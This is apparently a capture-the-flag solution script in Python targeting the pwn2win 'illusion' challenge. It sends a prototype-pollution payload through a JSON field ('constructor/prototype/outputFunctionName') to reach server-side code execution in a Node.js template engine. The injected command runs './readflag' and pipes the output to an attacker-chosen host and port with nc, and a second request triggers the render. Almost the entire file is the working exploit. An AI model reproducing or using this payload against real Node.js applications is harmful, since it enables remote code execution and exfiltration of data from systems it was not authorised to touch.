import requests

# Get user and password at "http://illusion.pwn2win.party:1337"

TARGET_URL = "http://illusion.pwn2win.party:35462"
USER = ""
PASSWORD = ""

MY_HOST = ""
MY_PORT = ""

requests.post(TARGET_URL + '/change_status', json = {
    "constructor/prototype/outputFunctionName": f"_; process.mainModule.require('child_process').execSync('./readflag | nc {MY_HOST} {MY_PORT}');//"
    }, auth=(USER, PASSWORD)
)

requests.get(TARGET_URL, auth=(USER, PASSWORD))
